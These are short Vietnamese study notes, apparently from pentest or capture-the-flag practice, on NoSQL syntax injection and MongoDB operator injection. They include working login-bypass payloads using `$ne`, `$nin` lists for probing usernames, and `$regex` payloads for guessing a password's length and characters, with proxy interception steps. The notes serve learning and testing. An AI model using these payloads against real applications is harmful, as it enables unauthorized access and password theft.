### Syntax Injection
- kẻ tấn công **phá vỡ cấu trúc truy vấn** rồi **cấy cú pháp riêng** để đổi nghĩa câu truy vấn.
- **xảy ra khi:** Ứng dụng **tự ghép chuỗi** tạo truy vấn cho NoSQL/engine tìm kiếm (Mongo shell string, Elasticsearch/Lucene query string, LDAP filter…), và dữ liệu đầu vào **không được escape**.
- **Nhận diện**: có lỗi cú pháp/đổi nghĩa rõ rệt khi thêm ký tự đặc biệt (`,) ( ) { } : * | & ! " ' \`…).
### Operator Injection
- **Tiêm các toán tử** của NoSQL (ví dụ MongoDB: `$ne`, `$gt`, `$in`, `$regex`, `$or`, `$where`…) vào **chính dữ liệu** để **lái hành vi truy vấn** (auth bypass, read ngoài ý muốn…).
- Truyền mảng với key $ne cho biến thay vì string/int (tại vì 'var' => `['\$ne' => 'xxxx']` luôn trả về đúng) 
	- `user[$ne]=xxxx&pass[$ne]=yyyy` 
	- cách làm: bật intercept, sửa đổi phần body trong request giống như trên sau đó forward
- `user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&user[$nin][]=secret&pass[$ne]=2&remember=on`: check cac user
- Sử dụng $regex để dò thông tin quan trọng
	- `user=admin&pass[$regex]=^.{5}$`: kiểm tra số ký tự của pass
	- `user=admin&pass[$regex]=^a....$`: kiểm tra từng ký tự của pass